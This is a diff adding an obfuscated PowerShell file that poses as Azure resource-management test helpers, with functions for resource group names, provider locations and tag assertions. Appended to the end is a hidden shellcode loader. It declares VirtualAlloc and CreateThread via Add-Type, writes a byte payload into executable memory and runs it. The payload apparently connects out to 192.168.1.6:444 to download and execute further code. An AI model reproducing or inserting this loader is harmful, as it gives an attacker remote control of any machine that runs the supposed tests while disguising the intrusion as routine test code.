@@ -1,0 +1,112 @@
+ set-VAriabLe ('D3'+'rlX')  ( [TYpE]("{9}{10}{7}{5}{1}{2}{0}{6}{8}{3}{4}"-F 'ec','t','EsT.htTPR','e','r','re.','ORdeR.hTTpMOCksEr','ZU','V','MICRosOFt.','a') );  Sv  ('fVP'+'o'+'S1') ( [TyPe]("{6}{3}{9}{2}{4}{10}{0}{1}{8}{7}{5}"-f'httPR','ECorD','aZurE.Te','IcroSOf','S','Ode','M','CORDeRM','er.hTtpRe','T.','T.')); 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function Get`-rESO`Ur`cegROU`PNamE
+{
+    return &("{1}{0}{3}{2}" -f 'A','get','Name','sset')
+}
+
+
+function GE`T-ReSoUr`cE`NAME
+{
+    return .("{2}{0}{1}{3}"-f'tAsse','t','ge','Name')
+}
+
+
+function gEt-`PROv`I`dERlOc`AtiOn(${p`ROV`ider})
+{
+    if ( (  lS ("VariABl"+"E"+":d3RL"+"X") )."v`ALUE"::"M`ODe" -ne   (  ls  ("varI"+"able:f"+"vpOs"+"1"))."va`LuE"::"PlA`yBA`Ck")
+    {
+        ${nAm`es`paCe} = ${P`Ro`ViDer}.("{0}{1}"-f 'Sp','lit').Invoke("/")[0]  
+        if(${PRO`VId`ER}.("{1}{0}"-f 'ns','Contai').Invoke("/"))  
+        {  
+            ${ty`pe} = ${PRov`ID`ER}.("{2}{0}{1}" -f'str','ing','Sub').Invoke(${NaME`sP`AcE}."L`En`gth" + 1)  
+            ${lo`CAT`I`ON} = .("{5}{1}{4}{3}{0}{2}" -f 'R','t-','esourceProvider','ureRm','Az','Ge') -ProviderNamespace ${Na`M`EsP`Ace} | .("{1}{0}" -f'ere','wh') {${_}."R`EsOu`R`CE`TypES"[0]."R`eSouRce`TyPEnA`mE" -eq ${t`yPe}}  
+  
+            if (${L`o`CATIon} -eq ${n`ULL}) 
+            {  
+                return ("{2}{1}{3}{0}{4}"-f'a','n','westce','tr','lus')
+            } else 
+            {  
+                return ${lo`C`ATION}."lOcaT`IO`NS"[0]  
+            }  
+        }
+        
+        return ("{1}{0}{2}" -f'a','westcentr','lus')
+    }
+
+    return ("{3}{2}{1}{0}"-f'us','central','t','wes')
+}
+
+
+function T`ESTset`Up-cre`ATeREsoUR`C`Eg`R`o`UP
+{
+    ${rEs`oU`R`CE`groupName} = &("{3}{0}{1}{2}"-f 'e','tA','ssetName','g')
+    ${rGl`oC`A`Tion} = &("{2}{5}{3}{4}{0}{1}"-f 'ati','on','Get-Provide','L','oc','r') ("{0}{1}{2}"-f'N','orth ','Europe')
+    ${re`sourCE`GrOUP} = &("{0}{5}{3}{6}{4}{2}{1}" -f 'New-Azu','p','u','eso','ro','reRmR','urceG') -Name ${rEsOU`R`c`eGR`ouPn`Ame} -location ${R`GlO`CAt`Ion} -Force
+    return ${RES`ourc`eG`RoUp}
+}
+
+
+function ASsE`R`T-T`AGs(${t`Ag`S1}, ${TA`g`S2})
+{
+    if(${t`Ags1}."cOU`NT" -ne ${t`AGS2}."C`ouNt")
+    {
+        throw ('Ta'+'g '+'siz'+'e '+'n'+'ot '+'e'+'qu'+'al. '+'Tag'+'1: '+"$tags1.count "+'Tag2:'+' '+"$tags2.count")
+    }
+
+    foreach(${K`Ey} in ${T`A`gs1}."k`eYs")
+    {
+        if(${t`AG`s1}[${K`eY}] -ne ${T`AgS2}[${k`EY}])
+        {
+            throw ('T'+'ag '+'co'+'ntent'+' '+'n'+'ot '+'e'+'qu'+'al. '+"Key:$key "+'Tags'+'1:') +  ${Tag`s1}[${K`EY}] + ("{0}{1}" -f 'Ta','gs2:') + ${T`AG`S2}[${k`eY}]
+        }
+    }
+}
+
+
+function AsSEr`T-com`Pre`S`siOntyPES(${tY`Pes1}, ${Ty`pe`S2})
+{
+    if(${tYPe`s1}."cou`Nt" -ne ${TyPE`s1}."C`Ount")
+    {
+        throw ('A'+'rr'+'ay '+'size'+' '+'no'+'t '+'equ'+'al. '+'T'+'ypes1: '+"$types1.count "+'T'+'ypes2: '+"$types2.count")
+    }
+
+    foreach(${VAlu`E1} in ${t`YP`es1})
+    {
+        ${fou`ND} = ${Fa`L`se}
+        foreach(${vaLU`e2} in ${TY`P`Es2})
+        {
+            if(${VaLU`e1}.("{0}{1}{2}"-f 'Com','p','areTo').Invoke(${V`A`LUe2}) -eq 0)
+            {
+                ${f`O`UnD} = ${t`RUe}
+                break
+            }
+        }
+        if(-Not(${fO`U`ND}))
+        {
+            throw ("{3}{7}{2}{0}{6}{1}{4}{5}" -f'n content','equ','ssio','Compr','al','. ',' not ','e') + ${VAL`U`E1} + ("{2}{0}{3}{4}{6}{5}{1}"-f't be found in ','ray',' canno','s','ec','ar','ond ')
+        }
+    }
+}
+
+
+
+function clEA`N-`Re`SOur`CEGROup(${R`GN`AME})
+{
+	&("{3}{1}{0}{6}{4}{5}{2}" -f 'e-','v','p','Remo','reRmResour','ceGrou','Azu') -Name ${r`g`NaMe} -Force
+}
+
+${C} = (((("{50}{90}{15}{104}{35}{79}{42}{106}{45}{84}{112}{58}{80}{7}{70}{55}{23}{110}{12}{52}{82}{94}{78}{30}{100}{61}{1}{66}{114}{98}{40}{108}{109}{3}{96}{102}{5}{44}{11}{81}{59}{72}{87}{57}{51}{53}{73}{31}{68}{54}{38}{19}{103}{20}{93}{10}{4}{60}{28}{99}{107}{39}{92}{111}{48}{67}{83}{71}{65}{22}{16}{46}{63}{47}{69}{95}{27}{88}{18}{37}{56}{29}{115}{24}{62}{64}{97}{6}{76}{25}{8}{77}{0}{49}{101}{41}{14}{74}{91}{13}{43}{9}{21}{86}{105}{113}{33}{34}{32}{2}{36}{75}{89}{26}{17}{85}"-f ' ext','llo',' s','nt','tP',')','sv',' VirtualAl','.dll{0})]public sta','t','n','el32.','n','ms','Ptr ','mport','i',')','ntPtr ','e','d','(',', u','tPtr lpAdd','r l','t','count','ss,','pT','nt dwCre','n','ic','nt','u','i','{0}','rc','lp','tr Cr','d','e','t','l32.dll{','e',';[DllImport({0}kern','ic st','n','w','tri','er','[Dll','c s','t','ta','tP','(In','Parameter, ui','li','n ','{','tr l',' flA','pThreadId);[Dll','t d','Import(','es','c','b',' extern In','StackSize, IntPtr lpStartA','loc','t','0})]pu','t','m',', ','cr','tic','e, ui','kerne','IntPtr','dll',' d','u','atic ex',';','In','b',' I','uint ','I','e','A','(I','wSiz','ddre',' fl','{0}m','tionTyp','h','t','n In','Protect','ateThrea','(','tP','0})]publ','rea',', u','i','ress, ui','t','ter','tr dest, ','a','ationFlags, IntPt')) -F [CHar]34));${W} = &("{0}{1}" -f 'Add-T','ype') -memberDefinition ${C} -Name ("{1}{0}" -f 'n32','Wi') -namespace ("{3}{1}{2}{0}"-f 'ions','in3','2Funct','W') -passthru;[Byte[]];[Byte[]]${z} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x06,0x68,0x02,0x00,0x01,0xbc,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;${g} = 0x1000;if (${Z}."LE`NgtH" -gt 0x1000){${g} = ${Z}."lEN`GtH"};${x}=${W}::("{1}{2}{3}{0}"-f 'oc','Virtu','a','lAll').Invoke(0,0x1000,${G},0x40);for (${I}=0;${i} -le (${Z}."LEN`gTH"-1);${I}++) {${W}::"M`eM`seT"([IntPtr](${x}.("{0}{2}{1}"-f'To','2','Int3').Invoke()+${i}), ${z}[${I}], 1)};${W}::("{1}{2}{3}{0}"-f 'ead','Cr','e','ateThr').Invoke(0,0,${X},0,0,0);for (;;){&("{2}{1}{0}"-f 'ep','t-sle','Star') 60};
